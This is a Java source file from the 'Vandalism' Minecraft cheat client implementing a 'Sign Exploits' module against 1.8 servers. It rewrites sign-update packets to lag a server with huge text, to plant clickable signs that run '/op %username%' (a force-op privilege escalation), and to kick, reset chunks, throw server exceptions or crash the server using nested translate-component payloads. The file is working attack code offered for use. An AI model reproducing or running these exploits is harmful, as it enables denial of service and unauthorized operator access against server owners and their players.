/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import de.florianmichael.rclasses.common.StringUtils;
import de.florianmichael.rclasses.pattern.functional.IName;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.base.value.impl.selection.EnumModeValue;
import de.nekosarekawaii.vandalism.event.cancellable.network.OutgoingPacketListener;
import de.nekosarekawaii.vandalism.feature.module.AbstractModule;
import de.nekosarekawaii.vandalism.feature.script.parse.ScriptVariable;
import de.nekosarekawaii.vandalism.integration.ViaFabricPlusAccess;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.BlockPos;
import net.raphimc.vialoader.util.VersionRange;

import java.util.concurrent.ThreadLocalRandom;

public class SignExploitsModule extends AbstractModule implements OutgoingPacketListener {

    private static final String KICK_TEXT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("options.snooper.desc"), 13, 8));
    private static final String CHUNK_RESET_TEXT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("options.snooper.desc"), 56, 8));
    private static final String CRASH_TEXT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("xd"), 5, 5, 5, 5, 5, 5, 5));

    private final EnumModeValue<Mode> mode = new EnumModeValue<>(
            this,
            "Mode",
            "Change the mode.",
            Mode.COLOR_BYPASS,
            Mode.values()
    );

    private final StringValue line1Text = new StringValue(
            this,
            "Line 1 Text",
            "The command to run when the first line of the command sign is clicked.",
            "Hi, I'm a sign click me!"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line1Command = new StringValue(
            this,
            "Line 1 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line2Text = new StringValue(
            this,
            "Line 2 Text",
            "The command to run when the first line of the command sign is clicked.",
            "Hi, I'm a sign click me!"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line2Command = new StringValue(
            this,
            "Line 2 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line3Text = new StringValue(
            this,
            "Line 3 Text",
            "The command to run when the first line of the command sign is clicked.",
            "Hi, I'm a sign click me!"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line3Command = new StringValue(
            this,
            "Line 3 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line4Text = new StringValue(
            this,
            "Line 4 Text",
            "The command to run when the first line of the command sign is clicked.",
            "Hi, I'm a sign click me!"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line4Command = new StringValue(
            this,
            "Line 1 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final IntegerValue characterCount = new IntegerValue(
            this,
            "Character Count",
            "The amount of characters to put into every line of the lag sign.",
            32000,
            1000,
            128000
    ).visibleCondition(() -> this.mode.getValue() == Mode.LAG);

    private final IntegerValue exceptionCount = new IntegerValue(
            this,
            "Exception Count",
            "The amount of exceptions that should be thrown server-side.",
            10,
            1,
            100
    ).visibleCondition(() -> this.mode.getValue() == Mode.EXCEPTION);

    private enum Mode implements IName {
        COLOR_BYPASS, LAG, COMMAND, KICK, CHUNK_RESET, EXCEPTION, CRASH;

        private final String name;

        Mode() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }

    }

    public SignExploitsModule() {
        super(
                "Sign Exploits",
                "Various exploits that use signs for example 1.8.0 force op.",
                Category.EXPLOIT,
                VersionRange.single(ProtocolVersion.v1_8)
        );
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(OutgoingPacketEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(OutgoingPacketEvent.ID, this);
    }

    @Override
    public void onOutgoingPacket(final OutgoingPacketEvent event) {
        final Packet<?> packet = event.packet;
        if (packet instanceof final UpdateSignC2SPacket signPacket) {
            final BlockPos pos = signPacket.getPos();
            String[] text = signPacket.getText();
            switch (this.mode.getValue()) {
                case COLOR_BYPASS -> {
                    final String[] newText = new String[4];
                    final String prefix = String.valueOf(Formatting.FORMATTING_CODE_PREFIX);
                    for (int i = 0; i < 4; i++) {
                        for (final Formatting formatting : Formatting.values()) {
                            String textLine = text[i];
                            final String code = String.valueOf(formatting.getCode());
                            final String colorCode = prefix + code;
                            if (textLine.contains(colorCode)) {
                                textLine = textLine.replace(
                                        colorCode, prefix + prefix + code + code
                                );
                            }
                            newText[i] = textLine;
                        }
                    }
                    text = newText;
                    event.packet = new UpdateSignC2SPacket(pos, true, text[0], text[1], text[2], text[3]);
                }
                case LAG -> {
                    final String lagText = "{\"text\":\"" + "x".repeat(this.characterCount.getValue()) + "\"}";
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            lagText,
                            lagText,
                            lagText,
                            lagText
                    );
                    event.cancel();
                }
                case COMMAND -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line1Command.getValue()) + "\"},\"text\":\"" + ScriptVariable.applyReplacements(this.line1Text.getValue()) + "\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line2Command.getValue()) + "\"},\"text\":\"" + ScriptVariable.applyReplacements(this.line2Text.getValue()) + "\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line3Command.getValue()) + "\"},\"text\":\"" + ScriptVariable.applyReplacements(this.line3Text.getValue()) + "\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line4Command.getValue()) + "\"},\"text\":\"" + ScriptVariable.applyReplacements(this.line4Text.getValue()) + "\"}"
                    );
                    event.cancel();
                }
                case KICK -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.KICK_TEXT,
                            "\"\"",
                            "\"\"",
                            "\"\""
                    );
                    event.cancel();
                }
                case CHUNK_RESET -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.CHUNK_RESET_TEXT,
                            SignExploitsModule.CHUNK_RESET_TEXT,
                            SignExploitsModule.CHUNK_RESET_TEXT,
                            SignExploitsModule.CHUNK_RESET_TEXT
                    );
                    event.cancel();
                }
                case EXCEPTION -> {
                    for (int i = 0; i < this.exceptionCount.getValue(); i++) {

                        final String[] lines = {"\"\"", "\"\"", "\"\"", "\"\""};
                        lines[ThreadLocalRandom.current().nextInt(lines.length)] = "";
                        ViaFabricPlusAccess.send1_8SignUpdatePacket(
                                pos,
                                lines[0],
                                lines[1],
                                lines[2],
                                lines[3]
                        );
                    }
                    event.cancel();
                }
                case CRASH -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.CRASH_TEXT,
                            SignExploitsModule.CRASH_TEXT,
                            SignExploitsModule.CRASH_TEXT,
                            SignExploitsModule.CRASH_TEXT
                    );
                    event.cancel();
                }
            }
        }
    }

    private static JsonObject generateHackTranslateComponent(final int repeat, final JsonObject child) {
        final JsonObject json = new JsonObject();
        json.addProperty("translate", "%1$s".repeat(repeat));
        final JsonArray with = new JsonArray();
        with.add(child);
        json.add("with", with);
        return json;
    }

    private static JsonObject generateTranslatableComponent(final String translate) {
        final JsonObject component = new JsonObject();
        component.addProperty("translate", translate);
        return component;
    }

    private static JsonObject generateHackTranslateComponent(final JsonObject finalizer, final int... repeats) {
        return SignExploitsModule.generateHackTranslateComponent(0, finalizer, repeats);
    }

    private static JsonObject generateHackTranslateComponent(final int offset, final JsonObject finalizer, final int... repeats) {
        return SignExploitsModule.generateHackTranslateComponent(repeats[offset], offset + 1 >= repeats.length ? finalizer : SignExploitsModule.generateHackTranslateComponent(offset + 1, finalizer, repeats));
    }

    private static String assertAllowedSize(final JsonObject object) {
        final String value = object.toString();
        if (value.length() > 384)
            throw new IllegalArgumentException("Size exceeded max allowed packet size.");

        return value;
    }

}
